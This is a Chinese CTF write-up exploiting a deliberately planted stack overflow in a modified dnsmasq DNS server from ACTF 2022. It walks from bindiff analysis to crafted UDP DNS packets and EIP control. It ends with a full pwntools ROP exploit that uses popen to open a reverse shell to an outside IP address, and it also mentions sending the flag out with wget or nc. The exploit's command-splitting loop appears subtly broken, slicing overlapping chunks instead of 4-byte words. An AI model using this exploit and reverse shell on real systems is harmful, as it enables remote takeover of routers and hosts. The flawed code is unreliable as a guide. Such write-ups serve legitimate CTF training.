# 从一道CTF题目看DNS服务漏洞
> Ayaka
> 来源：https://www.iotsec-zone.com/article/309

#题目信息：
题目来自2022年XCTF分站赛-ACTF中的一道pwn题，考点在于DNS服务器漏洞的发现与利用，其中DNS服务器采用的是IOT领域常见的Dnsmasq
![0.png](https://www.iotsec-zone.com/images/MdImg/feba8e1a7685bb39f6684311b6d6cf76.png)

题目描述：
```
I heard that you are proficient in the DNS protocol, there is just a chance to verify your ability, come and join to solve it.
```
题目附件：[https://github.com/team-s2/ACTF-2022/tree/main/pwn/master_of_dns/attachments](https://github.com/team-s2/ACTF-2022/tree/main/pwn/master_of_dns/attachments)

执行命令启动程序：
```python
./start.sh
```

启动的时候如果有如下报错
```
./start.sh: 7: netstat: not found
```
执行命令安装一下netstat即可：
```bash
sudo apt install net-tools
```

启动之后可以输入以下命令进行测试：
```
dig @127.0.0.1 -p 9999 baidu.com
```
如果显示如下则说明题目启动成功
![1.png](https://www.iotsec-zone.com/images/MdImg/6f98c0c08df83e9a2eec54d59c46c41e.png)

题目所对应的真实软件是dnsmasq
![2.png](https://www.iotsec-zone.com/images/MdImg/b7449993b26f3e7619e24c1f0462f884.png)

Dnsmasq为小型网络提供网络基础设施：DNS，DHCP，路由器通告和网络引导。它被设计为轻量级且占用空间小，适用于资源受限的路由器和防火墙。它还被广泛用于智能手机和便携式热点的共享，并支持虚拟化框架中的虚拟网络。

通过-v 命令查看一下版本：
![3.png](https://www.iotsec-zone.com/images/MdImg/ce725738831cf39b09d7b77f37a2dc1f.png)

网站链接：[https://thekelleys.org.uk/dnsmasq/](https://thekelleys.org.uk/dnsmasq/)
找到对应版本的源码下载下来
![4.png](https://www.iotsec-zone.com/images/MdImg/7b0359c4309b840f91ef9b8154d72dbb.png)

对照程序的保护情况和gcc版本，在本地自己编译一份，这样不仅可以快速定位到漏洞，并且在调试和梳理程序逻辑的时候也更加简单。

![5.png](https://www.iotsec-zone.com/images/MdImg/dbc2ccca1ca7c401a65775028ac799c7.png)

![6.png](https://www.iotsec-zone.com/images/MdImg/621415110d15f03705ebe6ffcb59628c.png)

# 漏洞发掘
通过bindiff等二进制比对软件，可以发现作者自己patch进去了一个危险的memcpy函数，即埋了一个漏洞进去。通过自己编译的程序可以看出，漏洞所在是extract_name函数，在末尾多了一个memcpy函数，这种函数通常意味着可能会存在栈溢出，堆溢出等缓冲区溢出的漏洞。并且题目没有开canary，所以栈溢出的面非常大。

![7.png](https://www.iotsec-zone.com/images/MdImg/48f66402136e780b9e0c7c59e9c61af0.png)

其中src是extract_name的一个参数，并且是一个字符串指针，dest则是栈上的一段缓冲区。

![8.png](https://www.iotsec-zone.com/images/MdImg/92ce230139ec51304f77f11ef2d5a75a.png)

从反汇编代码来看，程序会将域名通过'.'来分割，每段的第一个字节是当前段的长度字段，后面跟着的是域名本体，并且总长度不能超过0x400

![9.png](https://www.iotsec-zone.com/images/MdImg/2372e604ed5f73a3ce62f23dceae4ac8.png)

下面还有一个大写字符转小写的处理操作

接下来为了验证栈溢出漏洞存在，我们尝试发送一个域名非常长的查询请求。
![10.png](https://www.iotsec-zone.com/images/MdImg/88c0ef9b91d9dc0d772eb7b97237a1b6.png)

但是并没有如期令程序崩溃，而是给出了一个报错：
```
domain label longer than 63 characters
```
即两个点之间的label长度不能超过63个字节。

栈溢出需要精确控制字节数量，为了更加细致的了解数据包结构，可以用wireshark抓个包看看，我是用的虚拟机ubuntu环境来做的这个题，所以wireshark网卡抓包的时候选择

![11.png](https://www.iotsec-zone.com/images/MdImg/93eba1b3812feba1fb1c3553fe2eaf9f.png)

![12.png](https://www.iotsec-zone.com/images/MdImg/b38c31a5b28d34cb9ba4bae5ae76fc2e.png)

成功抓到DNS协议的包，看一下请求包结构：
![13.png](https://www.iotsec-zone.com/images/MdImg/dd004840cb0da415542e9691123a8290.jpg)

其中前两个字节是ID，对于本道题目来说没啥用，中间是一些标志位，直接抄就行，然后是查询语句，可以看到原来的baidu.com中的点已经变成了label length。最后固定的以两个\x00\x01结尾。

![14.png](https://www.iotsec-zone.com/images/MdImg/795c5b367b4c2b6dca7a4dfdf158f0bf.png)

dest距离栈底是0x381,每个label的长度为63的label和1的label length即0x40
也就是说至少需要14个完整的0x40的label，第15个label就可以到达栈底，进行栈溢出和rop链的布置，14个0x40是0x380,想要覆盖eip应该要覆盖到0x386位置的数据才能做到。
![15.png](https://www.iotsec-zone.com/images/MdImg/81acc386f5667ffe780cfa9d255be967.png)

但是在写payload的时候就发现，直接通过执行命令的方式做似乎不太行，因为一些特殊字符并不合法，所以还是要构造udp数据包然后直接向9999端口发包触发。

于是手动构造包结构，我们只需要关注udp里的DNS数据包即可，其余的pwntools会帮我们做好：
```python
from pwn import *
io = remote("127.0.0.1",9999,typ='udp')
payload=b'\x3f'+b'a'*0x3f
payload=payload*14+b'\x09'+b'aaaaa'+p32(0xdeadbeef)+p8(0)
head    = bytes.fromhex("000001200001000000000001")
end     = bytes.fromhex("00010001")

io.send(head + payload + end)
```

查询一下是哪个进程在监听9999端口：
```
sudo netstat -nlp | grep 9999
```
![16.png](https://www.iotsec-zone.com/images/MdImg/b4ca97253bdfb1903b1746ec8caee367.png)

然后用gdb attach上去
```
sudo gdb --pid 12469
```
然后发送udp包，查看gdb状态：
![17.png](https://www.iotsec-zone.com/images/MdImg/7a6ea328c038c692b018c51363340cdb.png)

可以看到eip被劫持成了0xdeadbeef，所以栈溢出漏洞存在并且可被利用。

# 漏洞利用

能够控制返回地址之后，需要想办法获取shell或者flag，直接执行system("/bin/sh")是不太现实了，udp协议不支持这种形式，比较理想的是能够反弹一个shell到我们自己的vps上，不行的话也可以通过wget或者nc等方式将flag通过其他方式带出来，这一切的前提是需要能够做到命令注入或者命令执行，程序中并没有system函数，但是好在有popen函数，popen会将第一个参数放到新fork出来的进程中执行并抓取返回结果，所以也有命令执行的效果。

之前在bindiff的过程中，还会发现作者新增了一个类似gadget的东西进去
![18.png](https://www.iotsec-zone.com/images/MdImg/7061ead3e0a31ec7b65d23a077357dd0.png)

这意味着只要我们能够控制eax，就能够进行一个任意地址写,而事实上也的确存在这样的gadget:
![19.png](https://www.iotsec-zone.com/images/MdImg/6671cbc7aab442aca3b72cc04dbdf1b9.png)

接下来就可以写ROP链了，将要执行的指令拆分成若干个4字节，然后通过上面的magic gadget写到bss段上去，最后通过popen执行，可以形成如下payload:
```python
from pwn import *
io = remote("127.0.0.1",9999,typ='udp')
magic=0x804b2b1
rax_ret=0x08059d44
head    = bytes.fromhex("000001200001000000000001")
end     = bytes.fromhex("00010001")
bss=0x80a7070
edx_ret=0x0807ec72
popen_addr = 0x804ab40
exit_addr = 0x804ad30
w_addr=0x080A6660

payload=b'\x3f'+b'a'*0x3f
payload=payload*14+b'\x3d'+b'aaaaa'

payload1=b''
payload2=b''

value=[]
cmd = b'/bin/sh -i >& /dev/tcp/1.117.96.138/123 0>&1'#len=44
for i in range(11):
    value.append(u32(cmd[i:i+4]))

payload1+=p32(rax_ret)+p32(bss)
for i in range(6):
    payload1+=p32(magic)+p32(value[i]^0xffffffff)

payload1+=b'\x3f'
payload1+=b'\xa9\x04\x08'

for i in range(6,11):
    payload2+=p32(magic)+p32(value[i]^0xffffffff)
payload2+=p32(popen_addr)+p32(exit_addr)+p32(bss+4)+p32(w_addr)+b'aaaa\x00'

io.send(head + payload+payload1+payload2 + end)
```
然后再自己vps上监听指定端口就可以拿到shell了
![20.png](https://www.iotsec-zone.com/images/MdImg/c2b3fe280ad5dd34617602fc9af3bc96.png)
